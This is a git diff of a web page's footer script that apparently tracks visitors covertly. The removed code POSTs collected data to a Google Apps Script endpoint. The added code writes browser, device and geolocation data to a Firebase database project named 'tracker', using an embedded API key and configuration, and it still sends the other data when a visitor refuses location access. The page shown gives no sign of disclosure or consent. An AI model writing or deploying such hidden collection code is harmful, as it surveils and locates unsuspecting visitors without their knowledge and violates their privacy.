@@ -38,8 +38,46 @@
     <p>&copy; 2024 RAJEET ASH. All rights reserved.</p>
 </footer>
 
-<!-- JavaScript to collect and send data -->
-<script>
+<!-- Firebase SDK -->
+<script type="module">
+    // Import the functions you need from the SDKs you need
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-analytics.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";
+
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyD1zzyK_6r4b_UIqPUhorPhS4YnFK5RbIc",
+        authDomain: "tracker-fd0ac.firebaseapp.com",
+        databaseURL: "https://tracker-fd0ac-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "tracker-fd0ac",
+        storageBucket: "tracker-fd0ac.appspot.com",
+        messagingSenderId: "414953366022",
+        appId: "1:414953366022:web:dcbc1443c06d549c3c1987",
+        measurementId: "G-9ZLTC4NVSC"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+    const database = getDatabase(app);
+
+    // Function to write data to Firebase Realtime Database
+    function writeDataToFirebase(data) {
+    // Create a valid timestamp for the path
+    const timestamp = new Date().toISOString().replace(/[:.]/g, '-'); // Replace colons and periods with dashes
+    const sanitizedTimestamp = timestamp.replace(/[^a-zA-Z0-9_-]/g, ''); // Remove any remaining invalid characters
+
+    set(ref(database, 'users/' + sanitizedTimestamp), data)
+        .then(() => {
+            console.log("Data successfully written to Firebase");
+        })
+        .catch((error) => {
+            console.error("Error writing data to Firebase: ", error);
+        });
+}
+
+
     async function collectData() {
         // Collect browser and device information
         const browserDetails = `Browser: ${navigator.userAgent}`;
@@ -71,38 +109,16 @@
                 (position) => {
                     collectedData.latitude = position.coords.latitude;
                     collectedData.longitude = position.coords.longitude;
-                    sendData(collectedData);
+                    writeDataToFirebase(collectedData); // Send data to Firebase
                 },
                 () => {
                     // If user denies location, send the rest of the data
-                    sendData(collectedData);
+                    writeDataToFirebase(collectedData);
                 }
             );
         } else {
             // If geolocation is not supported
-            sendData(collectedData);
-        }
-    }
-
-    async function sendData(data) {
-        console.log("Sending data to server:", data);
-
-        // URL of your Google Apps Script Web App
-        const url = "https://script.google.com/macros/s/AKfycbxDI-d75xIJEaLhZ0A4kNvLzUPjAqZxqRtqOEiTyshTwH-2IVoIJDLL1W5wMTd0LYJa/exec";
-
-        try {
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            });
-
-            const result = await response.json();
-            console.log("Data sent successfully:", result);
-        } catch (error) {
-            console.error("Error sending data:", error);
+            writeDataToFirebase(collectedData);
         }
     }
 
